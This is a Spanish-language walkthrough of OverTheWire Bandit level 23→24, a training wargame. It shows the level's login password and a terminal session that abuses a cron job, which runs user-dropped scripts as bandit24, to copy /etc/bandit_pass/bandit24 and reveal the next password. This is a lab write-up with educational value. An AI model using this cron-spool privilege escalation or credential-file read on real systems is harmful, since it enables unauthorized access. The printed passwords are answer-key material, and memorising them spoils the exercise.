# Level 23 to Level 24

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel
Host: bandit.labs.overthewire.org  
Port: 2220
Username: bandit23
Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

## Solución
Lo que hace el script del cronjob es ejecutar todos los scripts de la carpeta y borrarlos. Solo es cuestión de crear nuestro propio script para tomar ventaja de esto.

```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
bandit23@bandit:~$ mkdir /tmp/bandit2444 && cd /tmp/bandit2444
bandit23@bandit:/tmp/bandit2444$ vim zcript.sh
bandit23@bandit:/tmp/bandit2444$ cat zcript.sh
cat /etc/bandit_pass/bandit24 > /tmp/bandit2444/password
bandit23@bandit:/tmp/bandit2444$ chmod +x zcript.sh
bandit23@bandit:/tmp/bandit2444$ chmod 666 password
bandit23@bandit:/tmp/bandit2444$ ls -la
total 112
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 14:23 .
drwxrwx-wt 2779 root     root     106496 Feb 28 14:24 ..
-rw-rw-rw-    1 bandit23 bandit23      0 Feb 28 14:23 password
-rwxrwxr-x    1 bandit23 bandit23     58 Feb 28 14:21 zcript.sh
bandit23@bandit:/tmp/bandit2444$ cp zcript.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/bandit2444$ ls -la
total 116
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 14:23 .
drwxrwx-wt 2779 root     root     106496 Feb 28 14:27 ..
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 14:27 password
-rwxrwxr-x    1 bandit23 bandit23     58 Feb 28 14:21 zcript.sh
bandit23@bandit:/tmp/bandit2444$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

## Notas adicionales


## Referencias

